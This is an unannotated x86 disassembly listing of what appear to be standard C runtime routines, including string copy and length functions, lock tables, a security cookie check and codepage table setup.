  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
